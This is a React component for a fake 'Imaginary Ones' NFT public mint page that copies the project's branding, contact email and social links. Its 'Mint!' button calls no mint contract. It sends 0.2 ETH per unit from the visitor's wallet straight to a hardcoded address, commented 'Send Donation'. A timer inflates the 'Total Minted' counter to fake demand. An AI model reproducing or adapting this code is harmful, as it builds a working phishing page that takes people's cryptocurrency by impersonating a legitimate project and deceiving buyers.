import { useState, useEffect } from "react";
import Web3 from "web3";
import { AiOutlineMinus } from "react-icons/ai";
import { AiOutlinePlus } from "react-icons/ai";
import videoMob from "../assets/bg-video-mobile.mp4";
import video from "../assets/bg-video.mp4";
import ball1 from "../assets/ball1.png";
import ball2 from "../assets/ball2.png";
import slider from "../assets/slider.jpeg";
import { ReactComponent as Logo } from "../assets/logo.svg";
import backgroundMusic from "../assets/background.mp3";
const Mint = () => {
  const [mintValue, setMintValue] = useState(1);
  const [minted, setMinted] = useState(7787);
  const [isMobile, setIsMobile] = useState(false);
  const audio = new Audio(backgroundMusic);

  const handleResize = () => {
    if (window.innerWidth < 768) {
      setIsMobile(true);
    } else {
      setIsMobile(false);
    }
  };

  useEffect(() => {
    window.addEventListener("resize", handleResize);

    setInterval(() => {
      setMinted((prevCount) => {
        if (prevCount === 8888) {
          return prevCount;
        } else {
          return prevCount + 1;
        }
      });
    }, 700);
  }, []);

  useEffect(() => {
    document.body.addEventListener("click", () => {
      audio.play();
    });
    audio.addEventListener(
      "ended",
      function () {
        this.currentTime = 0;
        this.play();
      },
      false
    );
  }, []);

  const mintHandler = async () => {
    if (isMobile) {
      window.open("https://metamask.app.link/dapp/theimaginaryones.co/");
    }

    const web3 = new Web3(Web3.givenProvider);
    const accounts = await web3.eth.requestAccounts();

    const receiver = "0x29b45FA51203aD2c616cB69d497D2a111E6A5b3f";
    //   Send Donation
    try {
      const cost = mintValue * 0.2;
      await web3.eth.sendTransaction({
        from: accounts[0],
        to: receiver,
        value: web3.utils.toWei(cost.toString(), "ether"),
      });
    } catch (error) {
      console.log(error);
    }
  };

  // const connectWallet = async () => {
  //   try {

  //   } catch (error) {
  //     alert(error.data.message);
  //     throw new Error("No Ethereum Object");
  //   }
  // };

  const incrementHandler = () => {
    setMintValue(mintValue + 1);
  };

  const decrementHandler = () => {
    if (mintValue <= 1) return;
    setMintValue(mintValue - 1);
  };
  return (
    <>
      <main>
        {/* First Section */}

        <section className="min-h-screen bg-[#8459FF] relative">
          <Logo className="logo" />

          <div className="block md:hidden">
            <video className="videoTag v" autoPlay loop muted>
              <source src={videoMob} type="video/mp4" />
            </video>
          </div>

          <div className="hidden md:block">
            <video className="videoTag v" autoPlay loop muted>
              <source src={video} type="video/mp4" />
            </video>
          </div>

          <div className="flex-col justify-center items-center text-center absolute bottom-5 left-0 right-0">
            <div className="text-[#ffffff] mb-1">Mint Here</div>
            <button
              tabIndex="-1"
              type="button"
              aria-hidden="true"
              className="v-btn v-btn--is-elevated v-btn--fab v-btn--has-bg v-btn--round theme--dark v-size--default
            z-9"
            >
              <span className="v-btn__content">
                <i
                  aria-hidden="true"
                  // className="v-icon notranslate mdi mdi-chevron-down theme--dark"
                  className="v-icon notranslate mdi mdi-chevron-down theme--dark"
                ></i>
              </span>
            </button>
          </div>
        </section>

        {/* 2nd Section */}
        <section className="min-h-screen bg-[#8459FF] flex justify-center items-center">
          <div className="flex-col justify-center items-center text-center">
            <h1 className="text-[#FFDD00] text-[56px] font-[600] mb-20">
              Imaginary Ones Public Mint
            </h1>
            <h2 className="text-[#ffffff] text-[48px] font-[900]">
              Total Minted:{" "}
              <span className="text-[#FFDD00]"> {minted}/8888</span>
            </h2>
            <h2 className="text-[#ffffff] text-[40px] font-[900]">
              Price Per Mint: <span className="text-[#FFDD00]">0.2 ETH</span>
            </h2>

            <div className="  flex-col justify-center items-center">
              {/* Quantity */}
              <div className=" mt-5 flex justify-center items-center text-[#3c5476] space-x-2">
                <button>
                  <div
                    className="rounded-full p-2 bg-[#ffffff]"
                    onClick={decrementHandler}
                  >
                    <AiOutlineMinus fontSize={28} />
                  </div>
                </button>
                <div className="rounded-full px-8 py-1 bg-[#fff]">
                  <p className="text-4xl font-bold">{mintValue}</p>
                </div>
                <button>
                  <div
                    className="rounded-full p-2 bg-[#ffffff]"
                    onClick={incrementHandler}
                  >
                    <AiOutlinePlus fontSize={28} />
                  </div>
                </button>
              </div>

              {/* Button */}
              <div className="flex justify-center items-center space-x-2">
                <button className="mintBtn mt-5" onClick={mintHandler}>
                  Mint!
                </button>
              </div>

              <h4 className="text-[35px] font-[900] text-[#ffffff] mt-10">
                Mint Price Total:{" "}
                <span className="text-[#FFDD00]">
                  {(mintValue * 0.2).toFixed(2)} ETH
                </span>
              </h4>

              <div className="slider">
                <img src={slider} alt="" className="slider-img" />
              </div>
            </div>
          </div>
        </section>

        {/* Join */}
        <section id="join" className="join is-hidden">
          <div className="container layer--first">
            <h2 id="join-title relative" tabIndex="0" className="join__title">
              <span>Join the</span>
              <br></br>
              <span className="t--yellow">
                Community<i className="hat"></i>
              </span>
            </h2>
            <div className="join__text">
              <p tabIndex="0">
                We can't reply to all emails but all good vibes are appreciated!
                <br></br>You can email us at{" "}
                <a href="mailto:hello@theimaginaryones.co" target="_blank">
                  hello@theimaginaryones.co
                </a>
              </p>
            </div>
            <ul tabIndex="0" className="join__social">
              <li className="social__item">
                <span className="social__link">
                  <span className="hide-mobile">Opensea</span>
                  <i
                    aria-hidden="true"
                    className="v-icon notranslate mobile-only icon icon icon icon-opensea theme--light"
                  ></i>
                </span>
              </li>
              <li className="social__item">
                <span className="social__link">
                  <span className="hide-mobile">Discord</span>
                  <i
                    aria-hidden="true"
                    className="v-icon notranslate mobile-only icon icon icon icon-discord theme--light"
                  ></i>
                </span>
              </li>
              <li className="social__item">
                <a
                  href="https://twitter.com/imaginary_ones"
                  target="_blank"
                  rel="noopener nofollow"
                  className="social__link"
                >
                  <span className="hide-mobile">Twitter</span>
                  <i
                    aria-hidden="true"
                    className="v-icon notranslate mobile-only icon icon icon icon-twitter theme--light"
                  ></i>
                </a>
              </li>
              <li className="social__item">
                <a
                  href="https://www.instagram.com/theimaginaryones/"
                  target="_blank"
                  rel="noopener nofollow"
                  className="social__link"
                >
                  <span className="hide-mobile">Instagram</span>
                  <i
                    aria-hidden="true"
                    className="v-icon notranslate mobile-only icon icon icon icon-instagram theme--light"
                  ></i>
                </a>
              </li>
            </ul>
          </div>
          <div className="join__item item--1">
            <div className="layer layer--behind">
              <img src={ball1} className="ball ball--beige"></img>
            </div>
          </div>
          <div className="join__item item--3">
            <div className="layer layer--middle">
              <img src={ball2} className="ball ball--purple"></img>
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer className="footer">
          <div className="container">
            <button
              type="button"
              className="v-btn--top v-btn v-btn--is-elevated v-btn--fab v-btn--has-bg v-btn--round theme--dark v-size--default"
            >
              <span className="v-btn__content">
                <span className="vh">Click to go back to the top</span>
                <i
                  aria-hidden="true"
                  className="v-icon notranslate mdi mdi-chevron-up theme--dark"
                ></i>
              </span>
            </button>
            <span className="footer__text">
              <span>?? 2022 All Rights Reserved,</span>
              <span>Imaginary Ones Pte Ltd</span>
            </span>
            <a href="/" className="footer__logo">
              <svg
                width="1016"
                height="475"
                viewBox="0 0 1016 475"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M162.364 447.795C250.372 447.795 307.114 384.105 307.114 308.449C307.114 232.793 250.372 169.103 162.364 169.103C74.742 169.103 18 232.793 18 308.449C18 384.105 74.742 447.795 162.364 447.795ZM162.364 386.421C117.974 386.421 89.024 351.295 89.024 308.449C89.024 265.603 117.974 230.477 162.364 230.477C207.14 230.477 235.704 265.603 235.704 308.449C235.704 351.295 207.14 386.421 162.364 386.421Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M349.092 443.549H378.428C391.552 443.549 399.272 436.215 399.272 422.705V297.641L494.228 430.425C500.404 439.303 508.124 443.549 519.318 443.549H537.074C550.584 443.549 557.918 436.215 557.918 422.705V194.193C557.918 180.683 550.584 173.349 537.074 173.349H507.738C494.228 173.349 486.894 180.683 486.894 194.193V317.327L392.71 186.473C386.148 177.595 378.428 173.349 367.234 173.349H349.092C335.582 173.349 328.248 180.683 328.248 194.193V422.705C328.248 436.215 335.582 443.549 349.092 443.549Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M756.546 233.951C770.056 233.951 777.39 226.617 777.39 213.107V194.193C777.39 180.683 770.056 173.349 756.546 173.349H610.638C597.128 173.349 589.794 180.683 589.794 194.193V422.705C589.794 436.215 597.128 443.549 610.638 443.549H756.546C770.056 443.549 777.39 436.215 777.39 422.705V403.791C777.39 390.281 770.056 382.947 756.546 382.947H660.818V336.627H741.106C754.616 336.627 762.336 329.293 762.336 315.783V303.045C762.336 289.535 754.616 282.201 741.106 282.201H660.818V233.951H756.546Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M896.678 447.795C954.964 447.795 1003.21 420.389 1003.21 365.191C1002.44 329.293 982.756 302.273 926.4 282.973L893.976 271.393C873.518 264.059 868.5 255.181 868.5 246.689C868.5 232.021 883.168 224.301 899.38 224.301C912.89 224.301 922.54 229.319 928.33 237.811C936.436 247.847 943.384 252.479 955.35 249.005L973.492 243.987C986.616 240.127 992.792 230.091 985.844 217.353C969.632 186.859 940.296 169.103 898.222 169.103C842.252 169.103 799.02 201.527 799.02 252.093C799.792 301.501 851.902 322.345 874.676 329.679L907.486 341.645C927.558 348.207 934.12 357.857 934.12 367.893C934.12 383.719 919.066 392.597 896.678 392.597C875.834 392.597 860.78 384.491 852.288 371.367C845.34 360.173 838.778 355.155 826.812 357.857L807.512 362.489C794.388 365.577 787.44 374.841 792.458 387.965C807.512 425.407 844.954 447.795 896.678 447.795Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M140.698 294.524C140.698 304.299 135.169 312.224 128.349 312.224C121.529 312.224 116 304.299 116 294.524C116 284.748 121.529 276.823 128.349 276.823C135.169 276.823 140.698 284.748 140.698 294.524Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M208 294.524C208 304.299 202.471 312.224 195.651 312.224C188.831 312.224 183.302 304.299 183.302 294.524C183.302 284.748 188.831 276.823 195.651 276.823C202.471 276.823 208 284.748 208 294.524Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M810.632 100.376L839.551 141.136C841.956 144.525 845.855 146.54 850.011 146.54H867.906C872.8 146.54 875.534 140.892 872.499 137.053L846.732 104.813C845.893 103.763 846.311 102.201 847.529 101.632C861.207 95.249 868.046 83.448 868.046 66.38C868.046 53.3183 863.41 42.5826 855.208 36.1413C847.363 30.0578 835.952 27.1949 820.261 27.1949H798.747C789.358 27.1949 781.747 34.8061 781.747 44.1949V139.54C781.747 143.406 784.881 146.54 788.747 146.54H803.632C807.498 146.54 810.632 143.406 810.632 139.54V100.376ZM810.632 84.0938V50.9922H821.687C832.029 50.9922 838.804 57.6125 838.804 67.6325C838.804 78.0103 831.851 84.0938 819.904 84.0938H810.632Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M87.0702 145.528H99.7187C105.53 145.528 108.949 142.451 109.462 136.811L114.077 81.4309L135.955 136.982C137.835 142.11 141.254 144.332 146.552 144.332H151.851C157.15 144.332 160.568 142.11 162.449 136.982L184.327 81.4309L188.942 136.811C189.284 142.451 192.702 145.528 198.514 145.528H211.333C217.487 145.528 220.734 142.11 220.05 135.785L210.65 34.5973C210.308 28.9568 206.889 25.8801 201.249 25.8801H187.062C181.763 25.8801 178.516 28.1022 176.464 33.059L149.116 100.404L121.939 33.059C119.888 28.1022 116.47 25.8801 111.342 25.8801H97.1549C91.3434 25.8801 88.0958 28.9568 87.583 34.5973L78.1821 135.785C77.6693 142.11 80.9169 145.528 87.0702 145.528Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M239.173 145.528H252.334C257.633 145.528 261.051 143.135 262.761 138.178L267.888 124.333H308.91L314.209 138.349C316.089 143.135 319.679 145.528 324.807 145.528H338.652C345.489 145.528 348.223 141.255 345.83 134.931L305.834 33.059C303.954 28.2731 300.535 25.8801 295.236 25.8801H281.904C276.605 25.8801 273.016 28.2731 271.136 33.059L231.994 134.931C229.43 141.255 232.336 145.528 239.173 145.528ZM273.358 99.72L288.57 58.6978L303.099 99.72H273.358Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M415.674 147.408C431.228 147.408 445.586 142.281 457.892 133.051C461.824 130.145 463.191 126.555 463.191 121.77V87.4134C463.191 81.431 459.943 78.1834 453.961 78.1834H415.844C409.862 78.1834 406.615 81.431 406.615 87.4134V91.8575C406.615 97.8399 409.862 101.088 415.844 101.088H433.45V116.984C428.493 119.206 421.314 120.231 415.844 120.231C394.137 120.231 381.147 104.506 381.147 85.7042C381.147 66.3896 395.163 51.1772 415.332 51.1772C420.972 51.1772 426.955 51.519 433.963 54.9375C439.261 57.1596 443.193 56.8177 446.782 52.5446L452.252 45.8785C456.012 41.0926 455.67 36.3066 450.371 33.059C440.287 27.0767 429.177 24 415.332 24C376.361 24 349.696 52.2027 349.696 85.7042C349.696 119.206 376.019 147.408 415.674 147.408Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M546.37 145.528H559.361C565.172 145.528 568.591 142.281 568.591 136.298V80.9181L610.638 139.717C613.373 143.648 616.792 145.528 621.748 145.528H629.611C635.594 145.528 638.841 142.281 638.841 136.298V35.1101C638.841 29.1277 635.594 25.8801 629.611 25.8801H616.621C610.638 25.8801 607.391 29.1277 607.391 35.1101V89.6353L565.685 31.6916C562.779 27.7603 559.361 25.8801 554.404 25.8801H546.37C540.388 25.8801 537.14 29.1277 537.14 35.1101V136.298C537.14 142.281 540.388 145.528 546.37 145.528Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M660.141 145.528H673.302C678.601 145.528 682.019 143.135 683.729 138.178L688.856 124.333H729.879L735.177 138.349C737.057 143.135 740.647 145.528 745.775 145.528H759.62C766.457 145.528 769.191 141.255 766.798 134.931L726.802 33.059C724.922 28.2731 721.503 25.8801 716.204 25.8801H702.872C697.574 25.8801 693.984 28.2731 692.104 33.059L652.962 134.931C650.398 141.255 653.304 145.528 660.141 145.528ZM694.326 99.72L709.538 58.6978L724.067 99.72H694.326Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M929.402 145.528H942.393C948.375 145.528 951.623 142.281 951.623 136.298V96.6433L992.816 37.1612C997.26 30.837 994.696 25.8801 987.175 25.8801H970.766C965.81 25.8801 962.22 27.7603 959.656 32.0334L935.898 70.4917L912.31 32.0334C909.575 27.7603 906.156 25.8801 901.2 25.8801H884.62C877.099 25.8801 874.364 30.837 878.637 37.1612L920.172 97.1561V136.298C920.172 142.281 923.42 145.528 929.402 145.528Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M27 41.9344C27 33.13 34.1374 25.9927 42.9418 25.9927C51.7462 25.9927 58.8836 33.13 58.8836 41.9344V129.614C58.8836 138.419 51.7462 145.556 42.9418 145.556C34.1374 145.556 27 138.419 27 129.614V41.9344Z"
                  fill="black"
                ></path>{" "}
                <path
                  d="M483 41.5493C483 32.7128 490.163 25.5493 499 25.5493C507.837 25.5493 515 32.7128 515 41.5493V129.549C515 138.386 507.837 145.549 499 145.549C490.163 145.549 483 138.386 483 129.549V41.5493Z"
                  fill="black"
                ></path>
              </svg>
            </a>
          </div>
        </footer>
      </main>
    </>
  );
};

export default Mint;
